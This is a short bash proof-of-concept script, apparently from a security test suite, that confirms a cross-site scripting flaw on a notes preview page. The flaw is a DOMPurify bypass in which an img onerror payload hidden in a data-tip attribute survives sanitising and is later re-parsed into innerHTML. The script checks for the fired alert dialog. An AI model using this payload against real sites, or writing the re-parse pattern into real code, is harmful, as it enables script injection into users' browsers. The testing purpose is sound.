#!/usr/bin/env bash
# XSS-DOMPURIFY-001 (CWE-79): /notes/preview sanitises the reflected query with
# real DOMPurify before rendering it - and then re-parses a data-* attribute
# that sanitisation deliberately left alone.
#
# The payload is inert everywhere the sanitiser looks: it is an attribute VALUE
# on a span DOMPurify is happy to keep. It only becomes markup when the tooltip
# pass hands it back to innerHTML. So a transcript of the response proves
# nothing - the sink does not exist until the page's JS runs, and a fired dialog
# is the only evidence the script executed.
set -e; . "$(dirname "$0")/_lib.sh"
M="GIN-DOMPURIFY-PROVEN-7f3a"
P="<span data-tip=\"<img src=x onerror=alert('$M')>\">note</span>"
browser_dialog "$TARGET/notes/preview?q=$(urlenc "$P")" "$M"
